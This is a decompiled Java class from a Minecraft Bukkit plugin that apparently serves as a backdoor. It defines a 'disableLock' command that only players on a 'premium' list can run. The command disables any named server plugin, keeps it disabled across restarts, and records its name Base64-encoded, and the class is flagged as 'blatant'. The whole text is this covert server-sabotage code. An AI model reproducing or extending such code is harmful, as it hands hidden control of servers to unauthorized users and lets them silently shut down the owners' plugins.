/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import java.util.Base64;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class DisablelockCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (args.length <= 1) {
                p2.sendMessage(Settings.USAGE("disableLock <plugin>"));
            } else if (Bukkit.getPluginManager().getPlugin(args[1]) == null) {
                p2.sendMessage(Settings.PREFIX(args[1] + " doesn't exist. (Cap Sensitive)"));
            } else if (DataManager.getData().getStringList("epic-pl").isEmpty()) {
                p2.sendMessage(Settings.PREFIX(args[1] + " is now disabled and will stay disabled!"));
                byte[] add2 = Base64.getEncoder().encode(args[1].getBytes());
                DataManager.idk.add(new String(add2));
                DataManager.getData().set("epic-pl", DataManager.idk);
                DataManager.saveData();
                API.disablePlugin(args[1]);
            } else {
                for (String list : DataManager.getData().getStringList("epic-pl")) {
                    Plugin pl2;
                    if (list.contains((pl2 = Bukkit.getPluginManager().getPlugin(args[1])).getName())) {
                        p2.sendMessage(Settings.PREFIX("This plugin is already disable locked"));
                        continue;
                    }
                    p2.sendMessage(Settings.PREFIX(args[1] + " is now disabled and will stay disabled!"));
                    byte[] add3 = Base64.getEncoder().encode(args[1].getBytes());
                    DataManager.idk.add(new String(add3));
                    DataManager.getData().set("epic-pl", DataManager.idk);
                    DataManager.saveData();
                    API.disablePlugin(args[1]);
                }
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

